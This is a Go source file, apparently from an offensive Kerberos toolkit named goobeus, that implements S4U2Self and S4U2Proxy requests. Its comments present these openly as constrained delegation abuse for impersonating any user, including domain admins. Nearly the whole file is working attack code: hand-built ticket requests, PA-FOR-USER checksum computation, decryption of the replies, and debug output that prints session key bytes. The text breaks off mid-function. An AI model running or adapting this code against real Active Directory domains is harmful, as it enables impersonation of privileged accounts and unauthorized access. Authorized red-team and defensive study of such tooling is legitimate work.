package client

import (
	"context"
	"crypto/hmac"
	"crypto/md5"
	"crypto/sha1"
	"encoding/asn1"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/goobeus/goobeus/pkg/asn1krb5"
	"github.com/goobeus/goobeus/pkg/crypto"
	"github.com/goobeus/goobeus/pkg/ticket"
)

// EDUCATIONAL: S4U - Service for User Extensions
//
// S4U is Microsoft's extension to Kerberos for service delegation.
// It has two components:
//
// S4U2Self (Service-for-User-to-Self):
//   - Allows a service to get a ticket TO ITSELF on behalf of a user
//   - The service doesn't need the user's credentials
//   - Used for protocol transition (non-Kerberos auth → Kerberos)
//   - Requires TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition flag)
//
// S4U2Proxy (Service-for-User-to-Proxy):
//   - Allows a service to get a ticket to ANOTHER service as the user
//   - Uses the ticket from S4U2Self as evidence
//   - Constrained by msDS-AllowedToDelegateTo attribute
//
// Attack uses:
//   - Compromise service with constrained delegation
//   - S4U2Self to get ticket "as" any user (even domain admin!)
//   - S4U2Proxy to access allowed backend services as that user

// S4U2SelfRequest configures an S4U2Self request.
type S4U2SelfRequest struct {
	// Our TGT (the service's TGT)
	TGT        *ticket.Kirbi
	SessionKey []byte

	// User to impersonate
	TargetUser   string // SAMAccountName or UPN
	TargetDomain string // Domain of the target user

	// Our identity (the service)
	ServiceName string // Our SPN (what we're getting a ticket to)
	Domain      string

	// Options
	KDC string
}

// S4U2SelfResult contains the result of S4U2Self.
type S4U2SelfResult struct {
	*SessionInfo
	Kirbi       *ticket.Kirbi
	Base64      string
	Forwardable bool // Can be used for S4U2Proxy
}

// S4U2Self performs the S4U2Self exchange.
//
// EDUCATIONAL: S4U2Self Attack
//
// This is step 1 of constrained delegation abuse:
// 1. We compromise a service account with constrained delegation
// 2. We use S4U2Self to get a ticket impersonating a high-value user
// 3. The ticket is TO ourselves, FROM the target user
// 4. We then use S4U2Proxy to access allowed services as that user
//
// Even without TRUSTED_TO_AUTH_FOR_DELEGATION, we get a ticket,
// but it won't be forwardable (can't use for S4U2Proxy).
func S4U2Self(req *S4U2SelfRequest) (*S4U2SelfResult, error) {
	return S4U2SelfWithContext(context.Background(), req)
}

// S4U2SelfWithContext performs S4U2Self with context support.
func S4U2SelfWithContext(ctx context.Context, req *S4U2SelfRequest) (*S4U2SelfResult, error) {
	if req.TGT == nil {
		return nil, fmt.Errorf("TGT is required")
	}
	if req.TargetUser == "" {
		return nil, fmt.Errorf("target user is required")
	}
	if len(req.SessionKey) == 0 {
		if key := req.TGT.SessionKey(); key != nil {
			req.SessionKey = key.KeyValue
		} else {
			return nil, fmt.Errorf("session key is required")
		}
	}

	// Kerberos realms must be uppercase
	domain := strings.ToUpper(req.Domain)
	if domain == "" && req.TGT.CredInfo != nil && len(req.TGT.CredInfo.TicketInfo) > 0 {
		domain = req.TGT.CredInfo.TicketInfo[0].SRealm
	}

	targetDomain := strings.ToUpper(req.TargetDomain)
	if targetDomain == "" {
		targetDomain = domain
	}

	etype := detectEtype(req.SessionKey)
	client := NewClient(domain).WithKDC(req.KDC)

	// Build service name - for U2U with user principals, use NT-PRINCIPAL
	// For SPNs with "/" use NT-SRV-INST
	var sname asn1krb5.PrincipalName
	if strings.Contains(req.ServiceName, "/") {
		sname = parseServiceName(req.ServiceName)
	} else {
		// User principal (for U2U) - Impacket uses Principal(user, domain, NT_UNKNOWN)
		// where domain is the REALM, not a second name component
		// The sname only has 1 component (just the username)
		sname = asn1krb5.PrincipalName{
			NameType:   0, // NT-UNKNOWN for S4U2Self+U2U
			NameString: []string{req.ServiceName},
		}
	}

	fmt.Printf("[DEBUG] S4U2Self Request:\n")
	fmt.Printf("  Domain: %s\n", domain)
	fmt.Printf("  Target User: %s@%s\n", req.TargetUser, targetDomain)
	fmt.Printf("  Service Name: %v (type %d)\n", sname.NameString, sname.NameType)
	fmt.Printf("  Session Key Etype: %d (len=%d)\n", etype, len(req.SessionKey))
	fmt.Printf("  TGT Ticket Realm: %s\n", req.TGT.Ticket().Realm)

	tgsReq, err := buildS4U2SelfTGSREQ(req, sname, domain, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to build TGS-REQ: %w", err)
	}

	// Get client name from TGT's CredInfo (the user who owns the TGT)
	var clientPName asn1krb5.PrincipalName
	if req.TGT.CredInfo != nil && len(req.TGT.CredInfo.TicketInfo) > 0 {
		clientPName = req.TGT.CredInfo.TicketInfo[0].PName
	}
	fmt.Printf("[DEBUG] Client name for authenticator: type=%d, name=%v\n", clientPName.NameType, clientPName.NameString)

	// Add PA-TGS-REQ (our TGT with authenticator containing our client name)
	paTGSReq, err := buildPATGSReqWithClientPName(req.TGT.Ticket(), req.SessionKey, etype, req.TGT.Ticket().Realm, clientPName)
	if err != nil {
		return nil, fmt.Errorf("failed to build PA-TGS-REQ: %w", err)
	}
	tgsReq.PAData = append(tgsReq.PAData, paTGSReq)

	// Add PA-FOR-USER (who we want to impersonate)
	paForUser, err := buildPAForUser(req.TargetUser, targetDomain, req.SessionKey, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to build PA-FOR-USER: %w", err)
	}
	tgsReq.PAData = append(tgsReq.PAData, paForUser)

	fmt.Printf("[DEBUG] TGS-REQ has %d padata entries\n", len(tgsReq.PAData))
	for i, pa := range tgsReq.PAData {
		fmt.Printf("  PA[%d] type=%d len=%d\n", i, pa.PADataType, len(pa.PADataValue))
	}
	fmt.Printf("[DEBUG] ReqBody size: %d bytes\n", len(tgsReq.ReqBody.FullBytes))

	// Marshal to SEQUENCE first, then wrap with APPLICATION 12
	// Per RFC 4120: TGS-REQ ::= [APPLICATION 12] KDC-REQ
	// KDC-REQ ::= SEQUENCE { ... }
	// Go's MarshalWithParams("application,tag:12") doesn't add the inner SEQUENCE
	innerSeq, err := asn1.Marshal(*tgsReq)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal TGS-REQ: %w", err)
	}

	// Manually wrap with APPLICATION 12 tag
	buildLen := func(l int) []byte {
		if l < 128 {
			return []byte{byte(l)}
		} else if l < 256 {
			return []byte{0x81, byte(l)}
		}
		return []byte{0x82, byte(l >> 8), byte(l)}
	}

	tgsReqBytes := []byte{0x6c} // APPLICATION 12 tag
	tgsReqBytes = append(tgsReqBytes, buildLen(len(innerSeq))...)
	tgsReqBytes = append(tgsReqBytes, innerSeq...)

	fmt.Printf("[DEBUG] TGS-REQ bytes: %d (first 20: %x)\n", len(tgsReqBytes), tgsReqBytes[:min(20, len(tgsReqBytes))])

	// Dump TGS-REQ to file for debugging
	if err := os.WriteFile("goobeus_tgsreq.bin", tgsReqBytes, 0644); err != nil {
		fmt.Printf("[DEBUG] Warning: failed to write debug file: %v\n", err)
	} else {
		fmt.Printf("[DEBUG] TGS-REQ dumped to goobeus_tgsreq.bin (%d bytes)\n", len(tgsReqBytes))
	}

	respBytes, err := client.send(ctx, tgsReqBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to send TGS-REQ: %w", err)
	}

	if err := checkKRBError(respBytes); err != nil {
		return nil, err
	}

	// Parse TGS-REP manually (Go's asn1 can't handle GeneralString inside Ticket)
	// TGS-REP ::= APPLICATION 13 -> SEQUENCE { [0]pvno, [1]msg-type, [2]padata, [3]crealm, [4]cname, [5]ticket, [6]enc-part }
	ticketBytes, encPartData, err := parseTGSREPManual(respBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to parse TGS-REP: %w", err)
	}

	// Store raw ticket bytes
	var tgsRepTicket asn1krb5.Ticket
	tgsRepTicket.RawBytes = ticketBytes

	// Decrypt enc-part using key usage 8 (TGS-REP encrypted with session key, per RFC 4120)
	// Note: crypto.KeyUsageTGSRepSessionKey is 3 which is for AS-REP, not TGS-REP
	const keyUsageTGSRepSessionKey = 8
	decrypted, err := decryptEncPartBytes(encPartData, req.SessionKey, etype, keyUsageTGSRepSessionKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt TGS-REP: %w", err)
	}

	// Parse EncTGSRepPart manually (Go's asn1 has issues with APPLICATION tags and GeneralString)
	// We need: [0] key (session key for the new ticket), [4] flags, [5] authtime, [7] endtime, [9] srealm, [10] sname
	fmt.Printf("[DEBUG] Decrypted EncPart: %d bytes, first 10: %x\n", len(decrypted), decrypted[:min(10, len(decrypted))])

	// Extract session key from [0] of EncKDCRepPart
	encPart, err := parseEncKDCRepPartManual(decrypted)
	if err != nil {
		return nil, fmt.Errorf("failed to parse EncTGSRepPart: %w", err)
	}

	fmt.Printf("[DEBUG] S4U2Self session key: etype=%d, len=%d, first8=%x\n",
		encPart.Key.KeyType, len(encPart.Key.KeyValue), encPart.Key.KeyValue[:min(8, len(encPart.Key.KeyValue))])

	kirbi, err := buildKirbiFromTGSRaw(ticketBytes, encPart.Key)
	if err != nil {
		return nil, fmt.Errorf("failed to build kirbi: %w", err)
	}

	b64, _ := kirbi.ToBase64()

	// Check if forwardable
	forwardable := (encPart.Flags.Bytes[0] & 0x40) != 0 // FORWARDABLE flag

	return &S4U2SelfResult{
		SessionInfo: &SessionInfo{
			SessionKey:  encPart.Key,
			Ticket:      &tgsRepTicket,
			Kirbi:       kirbi,
			AuthTime:    encPart.AuthTime,
			StartTime:   encPart.StartTime,
			EndTime:     encPart.EndTime,
			RenewTill:   encPart.RenewTill,
			ServerRealm: encPart.SRealm,
			ServerName:  encPart.SName,
		},
		Kirbi:       kirbi,
		Base64:      b64,
		Forwardable: forwardable,
	}, nil
}

// S4U2ProxyRequest configures an S4U2Proxy request.
type S4U2ProxyRequest struct {
	// Our TGT
	TGT        *ticket.Kirbi
	SessionKey []byte

	// S4U2Self ticket (evidence)
	S4U2SelfTicket *ticket.Kirbi

	// Target service we want to access
	TargetSPN string
	Domain    string

	// Options
	KDC string
}

// S4U2ProxyResult contains the result of S4U2Proxy.
type S4U2ProxyResult struct {
	*SessionInfo
	Kirbi  *ticket.Kirbi
	Base64 string
}

// S4U2Proxy performs the S4U2Proxy exchange.
//
// EDUCATIONAL: S4U2Proxy Attack
//
// This is step 2 of constrained delegation abuse:
// 1. We have an S4U2Self ticket (from S4U2Self)
// 2. We include it in a TGS-REQ with CNAME-IN-ADDL-TKT flag
// 3. KDC validates we're allowed to delegate to the target
// 4. KDC issues a ticket to the target service AS the impersonated user!
//
// The "evidence" ticket proves we got the user's consent (in theory).
// In practice, we forged it with S4U2Self.
//
// Constrained by: msDS-AllowedToDelegateTo attribute
func S4U2Proxy(req *S4U2ProxyRequest) (*S4U2ProxyResult, error) {
	return S4U2ProxyWithContext(context.Background(), req)
}

// S4U2ProxyWithContext performs S4U2Proxy with context support.
func S4U2ProxyWithContext(ctx context.Context, req *S4U2ProxyRequest) (*S4U2ProxyResult, error) {
	if req.TGT == nil {
		return nil, fmt.Errorf("TGT is required")
	}
	if req.S4U2SelfTicket == nil {
		return nil, fmt.Errorf("S4U2Self ticket is required")
	}
	if req.TargetSPN == "" {
		return nil, fmt.Errorf("target SPN is required")
	}
	if len(req.SessionKey) == 0 {
		if key := req.TGT.SessionKey(); key != nil {
			req.SessionKey = key.KeyValue
		} else {
			return nil, fmt.Errorf("session key is required")
		}
	}

	domain := req.Domain
	if domain == "" && req.TGT.CredInfo != nil && len(req.TGT.CredInfo.TicketInfo) > 0 {
		domain = req.TGT.CredInfo.TicketInfo[0].SRealm
	}

	etype := detectEtype(req.SessionKey)
	client := NewClient(domain).WithKDC(req.KDC)

	// Build TGS-REQ with CNAME-IN-ADDL-TKT
	sname := parseServiceName(req.TargetSPN)
	tgsReq, err := buildS4U2ProxyTGSREQ(req, sname, domain, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to build TGS-REQ: %w", err)
	}

	// Add PA-TGS-REQ
	paTGSReq, err := buildPATGSReq(req.TGT.Ticket(), req.SessionKey, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to build PA-TGS-REQ: %w", err)
	}
	tgsReq.PAData = append(tgsReq.PAData, paTGSReq)

	// Marshal and send
	tgsReqBytes, err := asn1.MarshalWithParams(*tgsReq, "application,tag:12")
	if err != nil {
		return nil, fmt.Errorf("failed to marshal TGS-REQ: %w", err)
	}

	respBytes, err := client.send(ctx, tgsReqBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to send TGS-REQ: %w", err)
	}

	if err := checkKRBError(respBytes); err != nil {
		return nil, err
	}

	var tgsRep asn1krb5.TGSREP
	_, err = asn1.UnmarshalWithParams(respBytes, &tgsRep, "application,tag:13")
	if err != nil {
		return nil, fmt.Errorf("failed to parse TGS-REP: %w", err)
	}

	decrypted, err := decryptEncPart(tgsRep.EncPart, req.SessionKey, etype, crypto.KeyUsageTGSRepSessionKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt TGS-REP: %w", err)
	}

	var encPart asn1krb5.EncTGSRepPart
	_, err = asn1.UnmarshalWithParams(decrypted, &encPart, "application,tag:26")
	if err != nil {
		return nil, fmt.Errorf("failed to parse EncTGSRepPart: %w", err)
	}

	kirbi, err := buildKirbiFromTGS(&tgsRep.Ticket, &encPart)
	if err != nil {
		return nil, fmt.Errorf("failed to build kirbi: %w", err)
	}

	b64, _ := kirbi.ToBase64()

	return &S4U2ProxyResult{
		SessionInfo: &SessionInfo{
			SessionKey:  encPart.Key,
			Ticket:      &tgsRep.Ticket,
			Kirbi:       kirbi,
			AuthTime:    encPart.AuthTime,
			StartTime:   encPart.StartTime,
			EndTime:     encPart.EndTime,
			RenewTill:   encPart.RenewTill,
			ServerRealm: encPart.SRealm,
			ServerName:  encPart.SName,
		},
		Kirbi:  kirbi,
		Base64: b64,
	}, nil
}

// buildS4U2SelfTGSREQ builds a TGS-REQ for S4U2Self with U2U extension.
// U2U (User-to-User) allows any user to do S4U2Self without needing an SPN.
func buildS4U2SelfTGSREQ(req *S4U2SelfRequest, sname asn1krb5.PrincipalName, domain string, etype int32) (*asn1krb5.TGSREQRaw, error) {
	now := time.Now().UTC()

	// KDC Options:
	// - FORWARDABLE: needed for delegation
	// - RENEWABLE: allow ticket renewal
	// - CANONICALIZE (bit 15 = 0x00010000): canonicalize principal name
	// - ENC-TKT-IN-SKEY (bit 28 = 0x00000008): User-to-User extension
	// - Bit 27 (0x00000010): CNAME-IN-ADDL-TKT (used with S4U)
	// Match Impacket's options: 0x40810018
	options := asn1krb5.FlagForwardable | asn1krb5.FlagRenewable | 0x00010000 | 0x00000018
	optionsBits := make([]byte, 4)
	optionsBits[0] = byte((options >> 24) & 0xFF)
	optionsBits[1] = byte((options >> 16) & 0xFF)
	optionsBits[2] = byte((options >> 8) & 0xFF)
	optionsBits[3] = byte(options & 0xFF)

	// Marshal the TGT ticket with APPLICATION 1 tag for additional-tickets
	tgtTicket := req.TGT.Ticket()
	tgtTicketBytes, err := tgtTicket.Marshal()
	if err != nil {
		return nil, fmt.Errorf("failed to marshal TGT for additional-tickets: %w", err)
	}

	// Marshal SName with proper GeneralString encoding
	snameBytes, err := sname.Marshal()
	if err != nil {
		return nil, fmt.Errorf("failed to marshal sname: %w", err)
	}

	// Build req-body manually with GeneralString encoding
	// KDCReqBody ::= SEQUENCE {
	//   [0] kdc-options, [2] realm, [3] sname, [5] till, [7] nonce, [8] etype, [11] additional-tickets
	// }

	// Helper functions
	buildLen := func(l int) []byte {
		if l < 128 {
			return []byte{byte(l)}
		} else if l < 256 {
			return []byte{0x81, byte(l)}
		}
		return []byte{0x82, byte(l >> 8), byte(l)}
	}

	wrapExplicit := func(tag int, data []byte) []byte {
		result := []byte{byte(0xa0 + tag)}
		result = append(result, buildLen(len(data))...)
		return append(result, data...)
	}

	wrapSeq := func(data []byte) []byte {
		result := []byte{0x30}
		result = append(result, buildLen(len(data))...)
		return append(result, data...)
	}

	buildGeneralString := func(s string) []byte {
		data := []byte(s)
		result := []byte{0x1b} // GeneralString tag
		result = append(result, buildLen(len(data))...)
		return append(result, data...)
	}

	// [0] kdc-options BIT STRING
	kdcOptionsContent := append([]byte{0x03, 0x05, 0x00}, optionsBits...) // BIT STRING with 0 unused bits
	kdcOptions := wrapExplicit(0, kdcOptionsContent)

	// [2] realm GeneralString
	realm := wrapExplicit(2, buildGeneralString(domain))

	// [3] sname PrincipalName (already has GeneralString encoding)
	snameField := wrapExplicit(3, snameBytes)

	// [5] till GeneralizedTime
	tillStr := now.Add(10 * time.Hour).Format("20060102150405Z")
	tillContent := append([]byte{0x18, byte(len(tillStr))}, []byte(tillStr)...)
	till := wrapExplicit(5, tillContent)

	// [7] nonce INTEGER
	nonce := int32(now.UnixNano() & 0x7FFFFFFF)
	nonceBytes := []byte{0x02, 0x04, byte(nonce >> 24), byte(nonce >> 16), byte(nonce >> 8), byte(nonce)}
	nonceField := wrapExplicit(7, nonceBytes)

	// [8] etype SEQUENCE OF INTEGER - Impacket sends only session etype + RC4
	etypes := []int32{etype, crypto.EtypeRC4}
	var etypeContent []byte
	for _, e := range etypes {
		if e >= 0 && e < 128 {
			etypeContent = append(etypeContent, 0x02, 0x01, byte(e))
		} else {
			etypeContent = append(etypeContent, 0x02, 0x02, byte(e>>8), byte(e))
		}
	}
	etypeSeq := wrapSeq(etypeContent)
	etypeField := wrapExplicit(8, etypeSeq)

	// [11] additional-tickets SEQUENCE OF Ticket
	addTicketsSeq := wrapSeq(tgtTicketBytes)
	addTickets := wrapExplicit(11, addTicketsSeq)

	// Build complete req-body SEQUENCE
	reqBodyContent := append(kdcOptions, realm...)
	reqBodyContent = append(reqBodyContent, snameField...)
	reqBodyContent = append(reqBodyContent, till...)
	reqBodyContent = append(reqBodyContent, nonceField...)
	reqBodyContent = append(reqBodyContent, etypeField...)
	reqBodyContent = append(reqBodyContent, addTickets...)
	reqBodyBytes := wrapSeq(reqBodyContent)

	// Wrap req-body with [4] explicit tag manually
	// RawValue.FullBytes bypasses Go's tag processing
	reqBodyWrapped := wrapExplicit(4, reqBodyBytes)

	return &asn1krb5.TGSREQRaw{
		PVNO:    asn1krb5.PVNO,
		MsgType: asn1krb5.MsgTypeTGSREQ,
		ReqBody: asn1.RawValue{FullBytes: reqBodyWrapped},
	}, nil
}

// buildS4U2ProxyTGSREQ builds a TGS-REQ for S4U2Proxy.
func buildS4U2ProxyTGSREQ(req *S4U2ProxyRequest, sname asn1krb5.PrincipalName, domain string, etype int32) (*asn1krb5.TGSREQ, error) {
	now := time.Now().UTC()

	// Set CNAME-IN-ADDL-TKT flag (0x00004000)
	options := asn1krb5.FlagForwardable | asn1krb5.FlagRenewable | 0x00004000
	optionsBits := make([]byte, 4)
	optionsBits[0] = byte((options >> 24) & 0xFF)
	optionsBits[1] = byte((options >> 16) & 0xFF)
	optionsBits[2] = byte((options >> 8) & 0xFF)
	optionsBits[3] = byte(options & 0xFF)
	// Marshal the S4U2Self ticket with APPLICATION 1 tag for additional-tickets
	s4uTicket := req.S4U2SelfTicket.Ticket()
	s4uTicketBytes, err := s4uTicket.Marshal()
	if err != nil {
		return nil, fmt.Errorf("failed to marshal S4U2Self ticket for additional-tickets: %w", err)
	}

	body := asn1krb5.KDCReqBody{
		KDCOptions: asn1.BitString{
			Bytes:     optionsBits,
			BitLength: 32,
		},
		Realm:             domain,
		SName:             sname,
		Till:              now.Add(10 * time.Hour),
		Nonce:             int32(now.UnixNano() & 0x7FFFFFFF),
		EType:             []int32{etype, crypto.EtypeRC4}, // Impacket sends only session etype + RC4
		AdditionalTickets: []asn1.RawValue{{FullBytes: s4uTicketBytes}},
	}

	return &asn1krb5.TGSREQ{
		PVNO:    asn1krb5.PVNO,
		MsgType: asn1krb5.MsgTypeTGSREQ,
		ReqBody: body,
	}, nil
}

// PA-FOR-USER structure for S4U2Self
type paForUser struct {
	UserName    asn1krb5.PrincipalName `asn1:"explicit,tag:0"`
	UserRealm   string                 `asn1:"generalstring,explicit,tag:1"`
	Cksum       asn1krb5.Checksum      `asn1:"explicit,tag:2"`
	AuthPackage string                 `asn1:"ia5,explicit,tag:3"`
}

// buildPAForUser builds PA-FOR-USER padata for S4U2Self.
// Must manually construct ASN.1 because Go's asn1 package doesn't properly
// support GeneralString (tag 0x1b) which Kerberos requires.
func buildPAForUser(targetUser, targetRealm string, sessionKey []byte, etype int32) (asn1krb5.PAData, error) {
	// Build the S4UByteArray for checksum per MS-SFU spec:
	// 1. Name type (4-byte little-endian integer)
	// 2. Name string values concatenated
	// 3. User realm string
	// 4. Auth-package string ("Kerberos")
	// Use lowercase to match Impacket's working pcap capture
	lowerUser := strings.ToLower(targetUser)
	lowerRealm := strings.ToLower(targetRealm)

	var checksumData []byte
	nameType := make([]byte, 4)
	nameType[0] = byte(asn1krb5.NTPrincipal)
	nameType[1] = 0
	nameType[2] = 0
	nameType[3] = 0
	checksumData = append(checksumData, nameType...)
	checksumData = append(checksumData, []byte(lowerUser)...)
	checksumData = append(checksumData, []byte(lowerRealm)...)
	checksumData = append(checksumData, []byte("Kerberos")...)

	// Compute HMAC-MD5 checksum (always type -138 for PA-FOR-USER)
	cksum := computeHMACMD5(sessionKey, checksumData, 17)
	cksumType := int32(-138)

	// Manually construct PA-FOR-USER ASN.1 bytes with GeneralString (0x1b) encoding
	// PA-FOR-USER ::= SEQUENCE {
	//   userName     [0] PrincipalName,
	//   userRealm    [1] Realm (GeneralString),
	//   cksum        [2] Checksum,
	//   auth-package [3] GeneralString
	// }

	// Helper functions for ASN.1 construction
	buildLen := func(l int) []byte {
		if l < 128 {
			return []byte{byte(l)}
		} else if l < 256 {
			return []byte{0x81, byte(l)}
		}
		return []byte{0x82, byte(l >> 8), byte(l)}
	}

	wrapExplicit := func(tag int, data []byte) []byte {
		result := []byte{byte(0xa0 + tag)}
		result = append(result, buildLen(len(data))...)
		return append(result, data...)
	}

	wrapSeq := func(data []byte) []byte {
		result := []byte{0x30}
		result = append(result, buildLen(len(data))...)
		return append(result, data...)
	}

	// Build GeneralString (tag 0x1b)
	buildGeneralString := func(s string) []byte {
		data := []byte(s)
		result := []byte{0x1b} // GeneralString tag
		result = append(result, buildLen(len(data))...)
		return append(result, data...)
	}

	// Build INTEGER
	buildInt := func(n int32) []byte {
		if n >= 0 && n < 128 {
			return []byte{0x02, 0x01, byte(n)}
		} else if n >= 0 && n < 256 {
			return []byte{0x02, 0x02, 0x00, byte(n)}
		} else if n < 0 {
			// Two's complement for negative
			v := uint16(n & 0xFFFF)
			return []byte{0x02, 0x02, byte(v >> 8), byte(v)}
		}
		return []byte{0x02, 0x04, byte(n >> 24), byte(n >> 16), byte(n >> 8), byte(n)}
	}

	// Build OCTET STRING
	buildOctetString := func(data []byte) []byte {
		result := []byte{0x04}
		result = append(result, buildLen(len(data))...)
		return append(result, data...)
	}

	// [0] PrincipalName { [0] name-type INTEGER, [1] name-string SEQUENCE OF GeneralString }
	// Use lowercase to match Impacket's working pcap
	nameTypeBytes := wrapExplicit(0, buildInt(asn1krb5.NTPrincipal))
	nameStringSeq := wrapSeq(buildGeneralString(lowerUser))
	nameStringBytes := wrapExplicit(1, nameStringSeq)
	principalSeq := wrapSeq(append(nameTypeBytes, nameStringBytes...))
	userName := wrapExplicit(0, principalSeq)

	// [1] Realm (GeneralString)
	userRealm := wrapExplicit(1, buildGeneralString(lowerRealm))

	// [2] Checksum { [0] cksumtype INTEGER, [1] checksum OCTET STRING }
	cksumTypeBytes := wrapExplicit(0, buildInt(cksumType))
	cksumBytes := wrapExplicit(1, buildOctetString(cksum))
	checksumSeq := wrapSeq(append(cksumTypeBytes, cksumBytes...))
	checksumField := wrapExplicit(2, checksumSeq)

	// [3] auth-package (GeneralString per Impacket)
	authPackage := wrapExplicit(3, buildGeneralString("Kerberos"))

	// Combine all fields into PA-FOR-USER SEQUENCE
	paForUserContent := append(userName, userRealm...)
	paForUserContent = append(paForUserContent, checksumField...)
	paForUserContent = append(paForUserContent, authPackage...)
	pafuBytes := wrapSeq(paForUserContent)

	fmt.Printf("[DEBUG] PA-FOR-USER S4UByteArray (%d bytes): %x\n", len(checksumData), checksumData)
	fmt.Printf("[DEBUG] PA-FOR-USER checksum type=%d, cksum(%d bytes): %x\n", cksumType, len(cksum), cksum)
	fmt.Printf("[DEBUG] PA-FOR-USER encoded (%d bytes): %x\n", len(pafuBytes), pafuBytes)

	return asn1krb5.PAData{
		PADataType:  asn1krb5.PADataForUser,
		PADataValue: pafuBytes,
	}, nil
}

// computeHMACMD5 computes HMAC-MD5 checksum for type -138 (KERB_CHECKSUM_HMAC_MD5).
// Per RFC 4757 and MS-SFU, this requires key derivation:
//  1. Ksign = HMAC-MD5(key, "signaturekey\x00")
//  2. tmp = MD5(usage_le32 + data)
//  3. checksum = HMAC-MD5(Ksign, tmp)
func computeHMACMD5(key, data []byte, usage int) []byte {
	// Step 1: Derive Ksign
	signatureKey := []byte("signaturekey\x00")
	ksignMac := hmac.New(md5.New, key)
	ksignMac.Write(signatureKey)
	ksign := ksignMac.Sum(nil)

	// Step 2: Compute MD5(usage_le32 + data)
	usageBytes := make([]byte, 4)
	usageBytes[0] = byte(usage)
	usageBytes[1] = byte(usage >> 8)
	usageBytes[2] = byte(usage >> 16)
	usageBytes[3] = byte(usage >> 24)

	tmpHash := md5.New()
	tmpHash.Write(usageBytes)
	tmpHash.Write(data)
	tmp := tmpHash.Sum(nil)

	// Step 3: Final HMAC
	finalMac := hmac.New(md5.New, ksign)
	finalMac.Write(tmp)
	return finalMac.Sum(nil)
}

// computeAESChecksum computes HMAC-SHA1-96 checksum for AES.
// This is the standard checksum for AES encryption types.
func computeAESChecksum(key, data []byte, usage int, etype int32) []byte {
	// Use the crypto package's functions
	var result []byte
	var err error
	if etype == crypto.EtypeAES256 {
		result, err = crypto.HMACSHA1AES256(key, data)
	} else {
		result, err = crypto.HMACSHA1AES128(key, data)
	}
	if err != nil {
		// Fallback: basic HMAC-SHA1
		mac := hmac.New(sha1.New, key)
		mac.Write(data)
		result = mac.Sum(nil)[:12]
	}
	return result
}

// parseTGSREPManual parses TGS-REP manually to extract ticket and enc-part bytes.
// This avoids Go's asn1 package issues with GeneralString.
func parseTGSREPManual(data []byte) (ticketBytes, encPartData []byte, err error) {
	if len(data) < 10 || data[0] != 0x6d { // APPLICATION 13
		return nil, nil, fmt.Errorf("not a TGS-REP")
	}

	// Skip APPLICATION 13 header
	pos := 2
	if data[1] == 0x82 {
		pos = 4
	} else if data[1] == 0x81 {
		pos = 3
	}

	// Skip SEQUENCE header
	if pos < len(data) && data[pos] == 0x30 {
		if data[pos+1] == 0x82 {
			pos += 4
		} else if data[pos+1] == 0x81 {
			pos += 3
		} else {
			pos += 2
		}
	}

	// Parse fields until we find [5] ticket and [6] enc-part
	for pos < len(data) {
		if data[pos] < 0xa0 {
			break
		}
		tag := int(data[pos] - 0xa0)

		// Get field length
		fieldLen := 0
		contentPos := pos + 2
		if data[pos+1] == 0x82 {
			fieldLen = (int(data[pos+2]) << 8) | int(data[pos+3])
			contentPos = pos + 4
		} else if data[pos+1] == 0x81 {
			fieldLen = int(data[pos+2])
			contentPos = pos + 3
		} else if data[pos+1] < 0x80 {
			fieldLen = int(data[pos+1])
		}

		if tag == 5 { // ticket (APPLICATION 1 inside)
			ticketBytes = data[contentPos : contentPos+fieldLen]
		} else if tag == 6 { // enc-part (EncryptedData)
			// Parse EncryptedData to get etype and cipher
			encData := data[contentPos : contentPos+fieldLen]
			encPartData = encData
		}

		pos = contentPos + fieldLen
	}

	if len(ticketBytes) == 0 {
		return nil, nil, fmt.Errorf("ticket not found in TGS-REP")
	}
	if len(encPartData) == 0 {
		return nil, nil, fmt.Errorf("enc-part not found in TGS-REP")
	}

	return ticketBytes, encPartData, nil
}

// decryptEncPartBytes decrypts EncryptedData bytes.
func decryptEncPartBytes(encData, key []byte, etype int32, usage int) ([]byte, error) {
	// Parse EncryptedData: SEQUENCE { [0] etype, [1] kvno optional, [2] cipher }
	if len(encData) < 10 || encData[0] != 0x30 {
		return nil, fmt.Errorf("invalid EncryptedData")
	}

	pos := 2
	if encData[1] == 0x82 {
		pos = 4
	} else if encData[1] == 0x81 {
		pos = 3
	}

	// Find [2] cipher
	var cipher []byte
	for pos < len(encData) {
		if encData[pos] < 0xa0 {
			break
		}
		tag := int(encData[pos] - 0xa0)
		fieldLen := 0
		contentPos := pos + 2
		if encData[pos+1] == 0x82 {
			fieldLen = (int(encData[pos+2]) << 8) | int(encData[pos+3])
			contentPos = pos + 4
		} else if encData[pos+1] == 0x81 {
			fieldLen = int(encData[pos+2])
			contentPos = pos + 3
		} else if encData[pos+1] < 0x80 {
			fieldLen = int(encData[pos+1])
		}

		if tag == 2 { // cipher (OCTET STRING)
			octetData := encData[contentPos : contentPos+fieldLen]
			if octetData[0] == 0x04 {
				octetLen := int(octetData[1])
				octetStart := 2
				if octetData[1] == 0x82 {
					octetLen = (int(octetData[2]) << 8) | int(octetData[3])
					octetStart = 4
				} else if octetData[1] == 0x81 {
					octetLen = int(octetData[2])
					octetStart = 3
				}
				cipher = octetData[octetStart : octetStart+octetLen]
			}
		}
		pos = contentPos + fieldLen
	}

	if len(cipher) == 0 {
		return nil, fmt.Errorf("cipher not found in EncryptedData")
	}

	// Decrypt
	switch etype {
	case crypto.EtypeAES128, crypto.EtypeAES256:
		return crypto.DecryptAES(key, cipher, usage, int(etype))
	case crypto.EtypeRC4:
		return crypto.DecryptRC4(key, cipher, usage)
	default:
		return nil, fmt.Errorf("unsupported etype: %d", etype)
	}
}

// parseEncKDCRepPartManual parses EncKDCRepPart (EncASRepPart/EncTGSRepPart) manually.
// Returns EncTGSRepPart with Key and Flags populated.
func parseEncKDCRepPartManual(data []byte) (*asn1krb5.EncTGSRepPart, error) {
	// APPLICATION 25/26 -> SEQUENCE -> [0] key, [1] last-req, [2] nonce, [3] key-exp (opt), [4] flags, ...
	if len(data) < 20 {
		return nil, fmt.Errorf("EncKDCRepPart too short")
	}

	// Skip APPLICATION tag (25 or 26)
